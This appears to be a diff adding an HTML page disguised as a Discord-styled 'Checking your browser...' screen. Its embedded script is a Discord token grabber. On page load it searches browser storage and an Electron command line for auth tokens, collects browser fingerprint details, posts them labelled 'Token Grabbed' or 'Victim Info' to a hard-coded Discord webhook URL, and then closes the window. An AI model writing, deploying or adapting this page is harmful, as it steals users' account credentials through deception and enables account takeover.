@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking your browser...</title>
+    <style>
+        body { margin: 0; padding: 0; background: #36393f; color: white; font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { text-align: center; }
+        .spinner { border: 4px solid #202225; border-top: 4px solid #5865f2; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h3>Checking your browser...</h3>
+    </div>
+
+    <script>
+        (function() {
+            function getDiscordToken() {
+                // Patterns pour tous les types de tokens Discord
+                const patterns = [
+                    /mfa\.[A-Za-z0-9-_]{84}/,
+                    /[A-Za-z0-9]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}/,
+                    /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/
+                ];
+
+                // Sources possibles du token
+                const sources = [
+                    localStorage,
+                    sessionStorage
+                ];
+
+                let token = null;
+
+                // Chercher dans localStorage et sessionStorage
+                for (const source of sources) {
+                    for (let i = 0; i < source.length; i++) {
+                        const key = source.key(i);
+                        if (!key) continue;
+                        
+                        for (const pattern of patterns) {
+                            const value = source.getItem(key);
+                            const match = value?.match(pattern);
+                            if (match) {
+                                token = match[0];
+                                break;
+                            }
+                        }
+                        if (token) break;
+                    }
+                    if (token) break;
+                }
+
+                // Fallback: chercher dans les processus en cours (pour Electron)
+                if (!token) {
+                    try {
+                        const win = window;
+                        const proc = win.process;
+                        if (proc && proc.mainModule) {
+                            const cmdline = proc.mainModule.commandLine;
+                            const match = cmdline.match(/--auth_token=([A-Za-z0-9_-]+)/);
+                            if (match) token = match[1];
+                        }
+                    } catch(e) {}
+                }
+
+                return token;
+            }
+
+            function getUserInfo() {
+                try {
+                    return {
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        cookieEnabled: navigator.cookieEnabled,
+                        screen: `${screen.width}x${screen.height}`,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    };
+                } catch(e) {
+                    return null;
+                }
+            }
+
+            function sendToken(webhookUrl) {
+                const token = getDiscordToken();
+                const userInfo = getUserInfo();
+
+                if (!token) {
+                    // Même sans token, on envoie les infos user
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `**Victim Info (No token found)**\n\`\`\`json\n${JSON.stringify(userInfo, null, 2)}\n\`\`\``,
+                            username: 'Token Grabber'
+                        })
+                    });
+                    return;
+                }
+
+                const payload = {
+                    embeds: [{
+                        title: "🪝 Discord Token Grabbed",
+                        color: 0x5865f2,
+                        fields: [
+                            { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
+                            { name: "User Agent", value: userInfo.userAgent || 'N/A', inline: false },
+                            { name: "IP (via webhook)", value: "[Obtained by Discord]", inline: true },
+                            { name: "Screen", value: userInfo.screen || 'N/A', inline: true },
+                            { name: "Timezone", value: userInfo.timezone || 'N/A', inline: true },
+                            { name: "Language", value: userInfo.language || 'N/A', inline: true }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: { text: "HackerAI Pentest Tool" }
+                    }]
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(() => {}); // Silent fail
+            }
+
+            // Remplace WEBHOOK_URL par ton webhook Discord
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1485255645132492831/EQ0VR72IbkBOXW0QPzaouFqtvd41DE5IvHR_YAu6HfAAoI_X7ijERC_W8cTwgL20mUSK";
+            
+            // Exécute immédiatement et ferme la page
+            sendToken(WEBHOOK_URL);
+            window.close(); // Ferme la fenêtre/popup immédiatement
+        })();
+    </script>
+</body>
+</html>
